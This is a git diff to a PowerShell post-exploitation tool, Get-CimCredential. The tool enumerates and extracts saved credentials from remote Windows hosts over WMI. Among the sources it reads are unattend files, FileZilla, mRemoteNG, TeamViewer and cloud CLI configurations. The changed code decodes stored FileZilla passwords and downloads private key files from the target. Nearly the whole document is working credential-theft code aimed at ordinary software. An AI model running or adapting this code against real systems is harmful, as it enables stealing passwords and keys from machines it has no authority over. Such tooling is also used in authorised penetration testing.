@@ -11,7 +11,7 @@ Function Get-CimCredential {
 .DESCRIPTION
     Get-CimCredential enumerates registry keys and files containing credentials on a remote host through WMI.
     Credential files can be optionally downloaded via SMB or PowerShell Remoting.
-    Gathered credentials include autologon, unattended files, VNC, TeamViewer (CVE-2018-14333), WinSCP, PuTTY, Apache Directory Studio, AWS, Azure, Google Cloud Plateform, Bluemix.
+    Gathered credentials include autologon, unattended files, VNC, TeamViewer (CVE-2018-14333), WinSCP, PuTTY, mRemoteNG, Apache Directory Studio, AWS, Azure, Google Cloud Plateform, Bluemix.
 
 .PARAMETER ComputerName
     Specifies the target host.
@@ -111,10 +111,12 @@ Function Get-CimCredential {
             Write-Verbose "[$ComputerName] Failed to establish PSRemoting session."
             break
         }
+
+        $formatDefaultLimit = $global:FormatEnumerationLimit
+        $global:FormatEnumerationLimit = -1 # Prevent output truncation
     }
 
     PROCESS {
-
         # Common registry keys
 
         Get-WinlogonCredentialRegistry -CimSession $cimSession
@@ -199,6 +201,8 @@ Function Get-CimCredential {
         if ($psSession) {
             Remove-PSSession -Session $psSession
         }
+
+        $global:FormatEnumerationLimit = $formatDefaultLimit
     }
 }
 
@@ -670,7 +674,7 @@ Function Local:Get-UnattendCredentialFile {
                         $result | Add-Member -MemberType "NoteProperty" -Name "Domain" -Value $_.Domain
                         $result | Add-Member -MemberType "NoteProperty" -Name "Username" -Value $_.Username
                         $result | Add-Member -MemberType "NoteProperty" -Name "Password" -Value $password
-                        $result
+                        Write-Output $result
                     }
                 }
 
@@ -682,7 +686,7 @@ Function Local:Get-UnattendCredentialFile {
                         $result | Add-Member -MemberType "NoteProperty" -Name "Domain" -Value "N/A"
                         $result | Add-Member -MemberType "NoteProperty" -Name "Username" -Value $_.Name
                         $result | Add-Member -MemberType "NoteProperty" -Name "Password" -Value $password
-                        $result
+                        Write-Output $result
                     }
                 }
 
@@ -694,7 +698,7 @@ Function Local:Get-UnattendCredentialFile {
                         $result | Add-Member -MemberType "NoteProperty" -Name "Domain" -Value $_.Domain
                         $result | Add-Member -MemberType "NoteProperty" -Name "Username" -Value $_.Username
                         $result | Add-Member -MemberType "NoteProperty" -Name "Password" -Value $password
-                        $result
+                        Write-Output $result
                     }
                 }
 
@@ -706,7 +710,7 @@ Function Local:Get-UnattendCredentialFile {
                         $result | Add-Member -MemberType "NoteProperty" -Name "Domain" -Value "N/A"
                         $result | Add-Member -MemberType "NoteProperty" -Name "Username" -Value "N/A"
                         $result | Add-Member -MemberType "NoteProperty" -Name "Password" -Value $password
-                        $result
+                        Write-Output $result
                     }
                 }
             }
@@ -945,24 +949,38 @@ Function Local:Get-FilezillaCredentialFile {
                         $sessions = $xml.SelectNodes('//FileZilla3/RecentServers/Server')
                     }
                     foreach($session in $sessions) {
-                        $cred = @{}
-                        $session.ChildNodes | ForEach-Object {
-                            if ($_.InnerText) {
-                                if ($_.Name -eq "Pass") {
-                                    if ($_.Attributes["encoding"].Value -eq "base64") {
-                                        $cred["Password"] = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($_.InnerText))
+                        if ($session.Pass -and $session.Pass.Attributes["encoding"].Value -eq "base64") {
+                            $password = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($session.Pass.InnerText))
+                        }
+                        elseif ($session.Pass) {
+                            $password = $session.Pass.InnerText
+                        }
+                        if ($password -or ($keyFile = $session.KeyFile)) {
+                            $cred = @{}
+                            $cred["Username"] = $session.User
+                            $cred["Password"] = $password
+                            $cred["Hostname"] = $session.Host
+                            $cred["Port"] = $session.Port
+                            $cred["Protocol"] = $session.Protocol
+
+                            if ($keyFile) {
+                                # Download key file
+                                $keyFilePath = $keyFile -replace '\\','\\'
+                                $file = Get-CimInstance -ClassName CIM_LogicalFile -Filter "Name='$keyFilePath'" -CimSession $cimSession -Verbose:$false
+                                if ($file.Name) {
+                                    $cred["KeyFile"] = $keyFile
+                                    $outputDir = "$PWD\$ComputerName"
+                                    $outputFile = "$outputDir\$($temp.Get($temp.Count - 1))_$($file.FileName).$($file.Extension)"
+                                    New-Item -ItemType Directory -Force -Path $outputDir | Out-Null
+                                    if ($PSSession) {
+                                        Get-RemoteFile -Path $keyFile -Destination $outputFile -ComputerName $ComputerName -PSSession $PSSession
                                     }
                                     else {
-                                        $cred["Password"] = $_.InnerText
+                                        Get-RemoteFile -Path $keyFile -Destination $outputFile -ComputerName $ComputerName -Credential $Credential
                                     }
                                 }
-                                else {
-                                    $cred[$_.Name] = $_.InnerText
-                                }
                             }
-                        }
-                        if ($cred.Password) {
-                            $creds.Add((New-Object PSObject -Property $cred | Select-Object -Property Host,Port,User,Password)) | Out-Null
+                            $creds.Add((New-Object PSObject -Property $cred)) | Out-Null
                         }
                     }
                     if ($creds.Count -gt 0) {
